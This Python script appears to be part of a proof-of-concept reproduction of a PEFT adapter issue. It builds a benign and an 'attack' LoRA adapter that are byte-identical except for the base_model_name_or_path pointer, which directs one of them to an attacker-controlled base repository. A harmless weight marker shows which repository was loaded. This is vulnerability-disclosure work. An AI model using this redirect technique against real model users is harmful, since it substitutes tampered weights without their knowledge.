"""Build the malicious and control model packages for the
``peft.base_model_redirect_two_repos`` reproduction.

What is built (all under ``poc/work/``)
--------------------------------------
1. Two *data-only* second-hop base repositories, served later by ``mock_hub.py``:

   work/hub/mbe2e-control/tiny-random-gemma3-base-025/
       config.json  generation_config.json  model.safetensors   (oracle 0.25)
   work/hub/mbe2e-attacker/tiny-random-gemma3-base-075/
       config.json  generation_config.json  model.safetensors   (oracle 0.75)

   No ``.py``, no ``auto_map``, no program sidecar: the only thing that differs
   between the two repositories is one scalar inside ``model.safetensors``
   (``embed_tokens.weight[0, 0]``), the *embedding oracle*. Because the LoRA
   tensors in the adapter are all zero, a merge cannot change that scalar, so
   reading it back from the exported model tells us which repository's weights
   the export actually used.

2. Two LoRA adapters produced with PEFT's own ``save_pretrained()``:

   work/adapter_benign/   adapter_config.json -> mbe2e-control/tiny-random-gemma3-base-025
   work/adapter_attack/   adapter_config.json -> mbe2e-attacker/tiny-random-gemma3-base-075

   The two adapter directories are byte-identical except for that one string;
   ``make_poc.py`` prints the SHA-256 of ``adapter_model.safetensors`` for both
   to prove the weights are the same file.
"""
from __future__ import annotations

import hashlib
import json
import os
import shutil

import torch
import transformers
from peft import LoraConfig, get_peft_model
from transformers import (
    AutoModelForImageTextToText,
    Gemma3Config,
    Gemma3TextConfig,
    SiglipVisionConfig,
)

try:  # keep the console output readable for the evidence screenshots
    transformers.utils.logging.disable_progress_bar()
except Exception:  # noqa: BLE001
    pass

HERE = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(HERE, "work")
HUB = os.path.join(WORK, "hub")

CONTROL_REPO = "mbe2e-control/tiny-random-gemma3-base-025"
ATTACK_REPO = "mbe2e-attacker/tiny-random-gemma3-base-075"
ORACLE_INDEX = (0, 0)
# key inside the base repository's model.safetensors
BASE_ORACLE_KEY = "model.language_model.embed_tokens.weight"
SEED = 1234


def _tiny_gemma3_config() -> Gemma3Config:
    text = Gemma3TextConfig(
        vocab_size=64,
        hidden_size=16,
        intermediate_size=32,
        num_hidden_layers=2,
        num_attention_heads=2,
        num_key_value_heads=1,
        head_dim=8,
        max_position_embeddings=128,
        sliding_window=64,
        sliding_window_pattern=2,
    )
    vision = SiglipVisionConfig(
        hidden_size=8,
        intermediate_size=16,
        num_hidden_layers=1,
        num_attention_heads=1,
        image_size=16,
        patch_size=8,
    )
    return Gemma3Config(
        text_config=text.to_dict(),
        vision_config=vision.to_dict(),
        architectures=["Gemma3ForConditionalGeneration"],
    )


def build_base_repo(repo_id: str, oracle: float) -> str:
    """Write one data-only base repository and return its directory."""
    repo_dir = os.path.join(HUB, *repo_id.split("/"))
    shutil.rmtree(repo_dir, ignore_errors=True)
    os.makedirs(repo_dir)

    torch.manual_seed(SEED)  # identical weights for both repositories
    model = AutoModelForImageTextToText.from_config(_tiny_gemma3_config())
    with torch.no_grad():
        model.get_parameter(BASE_ORACLE_KEY)[ORACLE_INDEX] = oracle
    model.save_pretrained(repo_dir, safe_serialization=True)
    model.generation_config.save_pretrained(repo_dir)

    files = sorted(os.listdir(repo_dir))
    assert files == ["config.json", "generation_config.json", "model.safetensors"], files
    readback = float(model.get_parameter(BASE_ORACLE_KEY)[ORACLE_INDEX].detach())
    assert readback == oracle, readback

    print("  repo %-46s oracle=%s  files=%s" % (repo_id, readback, ",".join(files)))
    return repo_dir


def build_adapter(base_repo_dir: str, base_pointer: str, out_dir: str) -> None:
    """Wrap the base model with a rank-1, all-zero LoRA adapter and save it."""
    from peft import PeftModel  # noqa: F401  (documented PEFT workflow)

    shutil.rmtree(out_dir, ignore_errors=True)
    base = AutoModelForImageTextToText.from_pretrained(
        base_repo_dir, dtype=torch.float32, local_files_only=True
    )
    lora_cfg = LoraConfig(
        r=1,
        lora_alpha=1,
        lora_dropout=0.0,
        bias="none",
        target_modules=["q_proj"],
        task_type="CAUSAL_LM",
    )
    peft_model = get_peft_model(base, lora_cfg)
    with torch.no_grad():
        for name, param in peft_model.named_parameters():
            if "lora_" in name:
                param.zero_()
    peft_model.save_pretrained(out_dir)

    cfg_path = os.path.join(out_dir, "adapter_config.json")
    with open(cfg_path, encoding="utf-8") as f:
        cfg = json.load(f)
    cfg["base_model_name_or_path"] = base_pointer
    with open(cfg_path, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)
        f.write("\n")
    print("  adapter %-24s -> %s" % (os.path.basename(out_dir), base_pointer))


def sha256(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def write_sha256sums() -> int:
    entries = []
    for root, _dirs, files in os.walk(WORK):
        for name in files:
            p = os.path.join(root, name)
            rel = os.path.relpath(p, WORK).replace("\\", "/")
            entries.append((rel, sha256(p)))
    entries.sort()
    out = os.path.join(WORK, "SHA256SUMS.txt")
    with open(out, "w", encoding="utf-8") as f:
        for rel, digest in entries:
            f.write("%s  %s\n" % (digest, rel))
    return len(entries)


def main() -> int:
    print("building packages under %s" % WORK)
    print("transformers %s / peft %s / torch %s"
          % (transformers.__version__,
             __import__("peft").__version__, torch.__version__))
    shutil.rmtree(WORK, ignore_errors=True)
    os.makedirs(HUB)

    print("\n[1/3] second-hop base repositories (data only: json + safetensors)")
    control_dir = build_base_repo(CONTROL_REPO, 0.25)
    attack_dir = build_base_repo(ATTACK_REPO, 0.75)
    same_cfg = sha256(os.path.join(control_dir, "config.json")) == \
        sha256(os.path.join(attack_dir, "config.json"))
    same_gen = sha256(os.path.join(control_dir, "generation_config.json")) == \
        sha256(os.path.join(attack_dir, "generation_config.json"))
    print("  both repos: config.json identical=%s generation_config.json identical=%s"
          % (same_cfg, same_gen))

    print("\n[2/3] LoRA adapters (rank 1, zero tensors, PEFT save_pretrained)")
    benign_dir = os.path.join(WORK, "adapter_benign")
    attack_adapter_dir = os.path.join(WORK, "adapter_attack")
    build_adapter(control_dir, CONTROL_REPO, benign_dir)
    # copy the benign adapter byte-for-byte, then repoint only the base pointer
    shutil.copytree(benign_dir, attack_adapter_dir)
    cfg_path = os.path.join(attack_adapter_dir, "adapter_config.json")
    with open(cfg_path, encoding="utf-8") as f:
        cfg = json.load(f)
    cfg["base_model_name_or_path"] = ATTACK_REPO
    with open(cfg_path, "w", encoding="utf-8") as f:
        json.dump(cfg, f, indent=2)
        f.write("\n")

    w_benign = sha256(os.path.join(benign_dir, "adapter_model.safetensors"))
    w_attack = sha256(os.path.join(attack_adapter_dir, "adapter_model.safetensors"))
    print("  adapter_model.safetensors sha256 identical=%s" % (w_benign == w_attack))
    print("  %s" % w_benign)

    print("\n[3/3] package hashes")
    n = write_sha256sums()
    print("  work/SHA256SUMS.txt: %d entries" % n)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
